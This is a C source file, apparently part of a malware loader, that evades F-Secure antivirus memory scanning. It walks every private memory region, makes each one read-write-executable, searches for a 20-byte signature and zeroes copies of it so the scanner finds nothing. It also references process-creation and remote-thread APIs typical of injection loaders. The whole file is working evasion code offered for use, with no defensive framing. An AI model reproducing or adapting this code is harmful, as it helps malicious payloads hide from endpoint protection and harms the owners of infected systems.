#include "anti_av_fsecure_memory.h"
#include "global_config.h"
#include "functions_table.h"

#include "debug.h"


extern PCreateProcessInternalW CreateProcessInternalW;
extern PNtCreateThreadEx NtCreateThreadEx;

extern PBYTE detectableSignature;

BOOL searchWholeThing(LPSIGNATURE sig) {
	ALLOCATED_ADDRESSES_RESULT result = { 0 };

	DWORD TOTAL = 50;

	result.arr = (MEMORY_BASIC_INFORMATION*)calloc(TOTAL, sizeof(MEMORY_BASIC_INFORMATION)); // 100 positions

	SIZE_T ctr = 0;

	SYSTEM_INFO si = { 0 };

	l_GetSystemInfo(&si);

	SIZE_T currentAddress = (SIZE_T)si.lpMinimumApplicationAddress;
	SIZE_T max = (SIZE_T)si.lpMaximumApplicationAddress;

	DBG_MSG("searchWholeThing() - address of signature: 0x0x%p\n", sig->signature);

	PATTERN_RESULT patternRes = { 0 };
	patternRes.sigs = (PSIZE_T)calloc(sizeof(SIZE_T) * 10, 1);

	while (currentAddress < max) {
		MEMORY_BASIC_INFORMATION info;
		SecureZeroMemory(&info, sizeof(MEMORY_BASIC_INFORMATION));

		l_VirtualQuery((LPVOID)currentAddress, &info, sizeof(MEMORY_BASIC_INFORMATION));

		if (info.Type == MEM_PRIVATE && info.State != MEM_FREE && info.Protect != PAGE_NOACCESS) {
			DWORD oldProtect, dummyProtect;

			if (!l_VirtualProtect(info.AllocationBase, info.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
				// DBG_MSG("[FATAL] virtual protect failed, %d at 0x0x%p\n", l_GetLastError(), info.AllocationBase);
				currentAddress = (SIZE_T)info.BaseAddress + (SIZE_T)info.RegionSize;
				continue;
			}



			patternScanEx((SIZE_T)info.AllocationBase, info.RegionSize, "xxxxxxxxxxxxxxxxxxxx", sig, &patternRes, 10);

			if (patternRes.size > 0 && (LPBYTE)patternRes.sigs[0] != sig->signature) {
				DBG_MSG("searchWholeThing() - Old protcet was: 0x%p\n", info.Protect);
				//printMemoryInfo((LPVOID)patternRes.sigs[0]);
				SecureZeroMemory((PVOID)patternRes.sigs[0], 20);
			}

			l_VirtualProtect(info.AllocationBase, info.RegionSize, oldProtect, &dummyProtect);
		}

		currentAddress = (SIZE_T)info.BaseAddress + (SIZE_T)info.RegionSize;
	}

	result.dwSize = ctr;
	return TRUE;
}


VOID printMemoryInfo(LPVOID address) {
	MEMORY_BASIC_INFORMATION info = { 0 };

	l_VirtualQuery(address, &info, sizeof(MEMORY_BASIC_INFORMATION));

	DBG_MSG("printMemoryInfo() - BaseAddress -> 0x%p\n", (DWORD)info.BaseAddress);
	DBG_MSG("printMemoryInfo() - AllocationBase -> 0x%p\n", (DWORD)info.AllocationBase);
	DBG_MSG("printMemoryInfo() - AllocationProtect -> 0x%p\n", (DWORD)info.AllocationProtect);
	DBG_MSG("printMemoryInfo() - RegionSize -> 0x%p\n", (DWORD)info.RegionSize);
	DBG_MSG("printMemoryInfo() - State -> 0x%p\n", (DWORD)info.State);
	DBG_MSG("printMemoryInfo() - Protect -> 0x%p\n", (DWORD)info.Protect);
	DBG_MSG("printMemoryInfo() - Type -> 0x%p\n", (DWORD)info.Type);
}

/*
ALLOCATED_ADDRESSES_RESULT getAllocatedAddresses(DWORD dwProtect) {
	ALLOCATED_ADDRESSES_RESULT result = { 0 };

	DWORD TOTAL = 500;

	result.arr = (MEMORY_BASIC_INFORMATION*)calloc(TOTAL, sizeof(MEMORY_BASIC_INFORMATION)); // 50 positions

	if (result.arr = NULL) {
		DBG_MSG("calloc() faled.\n");
	}

	SIZE_T ctr = 0;

	SYSTEM_INFO si = { 0 };

	l_GetSystemInfo(&si);

	SIZE_T currentAddress = (SIZE_T)si.lpMinimumApplicationAddress;
	SIZE_T max = (SIZE_T)si.lpMaximumApplicationAddress;

	MEMORY_BASIC_INFORMATION currentMemory = { 0 }; // used to exclude current memory
	l_VirtualQuery(setPermissions, &currentMemory, sizeof(MEMORY_BASIC_INFORMATION));

	while (currentAddress < max) {
		MEMORY_BASIC_INFORMATION info = { 0 };

		l_VirtualQuery((LPVOID)currentAddress, &info, sizeof(MEMORY_BASIC_INFORMATION));

		DBG_MSG("info.Protect: 0x%0x\n", info.Protect);

		if (info.Protect == dwProtect && info.AllocationBase != currentMemory.AllocationBase) { // exclude current page
			result.arr[ctr++] = info;
			DBG_MSG("getAllocatedAddresses() - [!X!] FOUND ADDRESS\n");
			DBG_MSG("getAllocatedAddresses() - [!] Found memory region: 0x%p at 0x%p of size 0x%p\n\n", ctr, info.BaseAddress, info.RegionSize);
		}

		currentAddress = (SIZE_T)info.BaseAddress + (SIZE_T)info.RegionSize;

		if (ctr >= TOTAL) {
			break;
		}
	}

	result.dwSize = ctr;

	DBG_MSG("getAllocatedAddresses() - result.dwSize: %d \n", result.dwSize);

	return result;
}
*/
//ALLOCATED_ADDRESSES_RESULT getAllocatedAddresses(DWORD dwProtect, PVOID start_address, PVOID end_address) {
ALLOCATED_ADDRESSES_RESULT getAllocatedAddresses(PVOID memory_start_address, DWORD memory_size) 
{
	ALLOCATED_ADDRESSES_RESULT result = { 0 };
	DWORD TOTAL = 1;

	//
	result.arr = (MEMORY_BASIC_INFORMATION*)calloc(TOTAL, sizeof(MEMORY_BASIC_INFORMATION)); 

	if (result.arr == NULL) {
		DBG_MSG("getAllocatedAddresses() - calloc() faled.\n");
		return result;
	}
	else {
		DBG_MSG("getAllocatedAddresses() - calloc() success. result.arr: 0x%p \n", result.arr);
	}

	//
	MEMORY_BASIC_INFORMATION info = { 0 };

	DBG_MSG("getAllocatedAddresses() - call l_VirtualQuery() with memory_start_address: 0x%p \n", memory_start_address);

	SIZE_T ret_VirtualQuery = l_VirtualQuery((LPVOID)memory_start_address, &info, sizeof(MEMORY_BASIC_INFORMATION));

	if (ret_VirtualQuery == 0) {
		DBG_MSG("getAllocatedAddresses() - l_VirtualQuery() faled. Error code: %d \n", l_GetLastError());
		return result;
	}
	else {
		DBG_MSG("getAllocatedAddresses() - l_VirtualQuery() success.\n");
	}

	DBG_MSG("getAllocatedAddresses() - l_VirtualQuery() result, info.AllocationBase: 0x%p, info.RegionSize: 0x%x, info.Protect: 0x%x \n", info.AllocationBase, info.RegionSize, info.Protect);

	//
	DBG_MSG("getAllocatedAddresses() - filling the result now.\n");

	*result.arr = info;
	result.dwSize = 1;

	//
	return result;

	/*
	DWORD TOTAL = 500;

	result.arr = (MEMORY_BASIC_INFORMATION*)calloc(TOTAL, sizeof(MEMORY_BASIC_INFORMATION)); // 50 positions

	if (result.arr = NULL) {
		DBG_MSG("calloc() faled.\n");
	}

	SIZE_T ctr = 0;

	SYSTEM_INFO si = { 0 };

	l_GetSystemInfo(&si);

	SIZE_T currentAddress = (SIZE_T)start_address;
	SIZE_T max = (SIZE_T)end_address;

	MEMORY_BASIC_INFORMATION currentMemory = { 0 }; // used to exclude current memory
	l_VirtualQuery(setPermissions, &currentMemory, sizeof(MEMORY_BASIC_INFORMATION));

	while (currentAddress < max) {
		MEMORY_BASIC_INFORMATION info = { 0 };

		l_VirtualQuery((LPVOID)currentAddress, &info, sizeof(MEMORY_BASIC_INFORMATION));

		DBG_MSG("info.Protect: 0x%0x\n", info.Protect);

		if (info.Protect == dwProtect && info.AllocationBase != currentMemory.AllocationBase) { // exclude current page
			result.arr[ctr++] = info;
			DBG_MSG("getAllocatedAddresses() - [!X!] FOUND ADDRESS\n");
			DBG_MSG("getAllocatedAddresses() - [!] Found memory region: 0x%p at 0x%p of size 0x%p\n\n", ctr, info.BaseAddress, info.RegionSize);
		}

		currentAddress = (SIZE_T)info.BaseAddress + (SIZE_T)info.RegionSize;

		if (ctr >= TOTAL) {
			break;
		}
	}

	result.dwSize = ctr;

	DBG_MSG("getAllocatedAddresses() - result.dwSize: %d \n", result.dwSize);

	*/

	return result;
}

BOOL setPermissions(MEMORY_BASIC_INFORMATION* addresses, DWORD dwSize, DWORD dwProtect) {
	DWORD dummy;

	DBG_MSG("setPermissions() - [X] Memory to protect size: %d\n", dwSize);

	for (DWORD i = 0; i < dwSize; i++) {
		MEMORY_BASIC_INFORMATION* info = addresses + i;

		if (!l_VirtualProtect(info->AllocationBase, info->RegionSize, dwProtect, &dummy)) {
			DBG_MSG("setPermissions() - [X] Set permission failed, memory is not protected\n");
			return FALSE;
		}

		DBG_MSG("setPermissions() - [!] Changed protection of region: at 0x%p of size 0x%p\n\n", info->AllocationBase, info->RegionSize);
	}

	DBG_MSG("setPermissions() - Restored all the memory regions\n");
	return TRUE;
}


BOOL patternScanEx(SIZE_T startAddress, SIZE_T length, LPCSTR mask, LPSIGNATURE signature, LPPATTERN_RESULT res, DWORD resArrSize) {
	res->size = 0;

	if (strlen(mask) != signature->sigSize || length <= 0) {
		DBG_MSG("patternScanEx() - Different size of mask and signature, mask: %d, signature: %d, length: %d\n", strlen(mask), signature->sigSize, length);
		return FALSE;
	}

	for (SIZE_T i = 0; i < length; i++) {
		if (patternMatches(startAddress + i, mask, signature)) {
			DBG_MSG("patternScanEx() - [SIG_SCAN] Found bytes at 0x%p\n", startAddress + i);
			if (res->size < resArrSize) {
				res->sigs[res->size++] = startAddress + i;
			}
			else {
				DBG_MSG("patternScanEx() - Buffer overflow!!\n");
				res->size++;
			}
		}
	}

	return TRUE;
}


/*
*	Says when a area in the specified process matches the signature.
*
*	@param  a HANDLE to the process.
*	@param  the baseAddress that the function will try to match.
*	@param  the mask of the pattern.
*	@param  a vector which contains the signature of the pattern.
*	@return TRUE if the signature of the pattern matches the BYTES in the area in the memory specified by the @param address.
*/
BOOL patternMatches(SIZE_T address, LPCSTR mask, LPSIGNATURE signature) {
	LPBYTE mem = NULL;


	for (SIZE_T i = 0; i < signature->sigSize; i++) {
		mem = (LPBYTE)(address + i);

		// DBG_MSG("mem is: 0x%p, sig is: 0x%p at 0x%p, index: %d\n", *mem, signature->signature[i], address, i);

		if (mask[i] == 'x' && *mem != signature->signature[i]) {
			return FALSE;
		}
	}

	return TRUE;
}